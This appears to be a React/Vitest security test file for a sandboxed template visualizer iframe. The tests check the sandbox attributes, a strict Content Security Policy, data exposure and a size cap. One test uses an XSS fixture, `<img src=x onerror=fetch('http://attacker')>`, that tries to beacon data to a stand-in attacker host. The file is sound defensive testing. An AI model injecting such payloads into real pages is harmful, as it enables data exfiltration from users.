import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { VisualizerFrame } from '@/components/shared/VisualizerFrame';

/**
 * Visualizer security boundary — the iframe MUST be sandboxed without
 * `allow-same-origin` so a malicious template can't reach the renderer
 * window's origin. The composed srcDoc MUST carry a strict CSP that
 * blocks outbound network egress so an `<img onerror=fetch(...)>` style
 * payload can't beacon out either.
 *
 * If either guard regresses, this test fails — these are load-bearing
 * for the Postman-parity claim.
 */
describe('VisualizerFrame — sandboxing & CSP', () => {
  it('renders an iframe with sandbox="allow-scripts" and NO allow-same-origin', () => {
    const { container } = render(<VisualizerFrame template="<h1>hi</h1>" data={{}} />);
    const iframe = container.querySelector('iframe');
    expect(iframe).toBeTruthy();
    const sandbox = iframe?.getAttribute('sandbox') ?? '';
    expect(sandbox).toBe('allow-scripts');
    // Defensive: even if a future contributor adds tokens, allow-same-origin
    // must not be one of them. (Combining the two is what defeats the boundary.)
    expect(sandbox.split(/\s+/)).not.toContain('allow-same-origin');
  });

  it('srcDoc embeds a strict CSP that blocks remote sources', () => {
    const { container } = render(
      <VisualizerFrame template="<img src=x onerror=fetch('http://attacker')>" data={{}} />
    );
    const srcDoc = container.querySelector('iframe')?.getAttribute('srcDoc') ?? '';
    // Default-src 'none' is the blanket gate that stops any unlisted source.
    expect(srcDoc).toMatch(/default-src 'none'/);
    // No img-src http(s) — only data: URLs are allowed.
    expect(srcDoc).toMatch(/img-src data:/);
    expect(srcDoc).not.toMatch(/img-src[^;]*https?:/);
    // Form submissions are blocked at the CSP level.
    expect(srcDoc).toMatch(/form-action 'none'/);
    // The malicious template still appears in the srcDoc (the CSP — not
    // template sanitization — is what neutralizes it), so the test
    // captures CSP presence rather than absence of the template.
    expect(srcDoc).toContain('onerror=fetch');
  });

  it('pm.getData() exposes the captured data inside the iframe', () => {
    const { container } = render(<VisualizerFrame template="<p>x</p>" data={{ title: 'Hello' }} />);
    const srcDoc = container.querySelector('iframe')?.getAttribute('srcDoc') ?? '';
    expect(srcDoc).toContain('window.pm = window.pm || {}');
    expect(srcDoc).toContain('"title":"Hello"');
  });

  it('refuses to render templates exceeding the 1MB cap', () => {
    const huge = 'x'.repeat(2 * 1024 * 1024);
    const { container } = render(<VisualizerFrame template={huge} data={{}} />);
    expect(container.querySelector('iframe')).toBeFalsy();
    expect(container.textContent).toMatch(/exceeds the 1 MB safety cap/);
  });
});
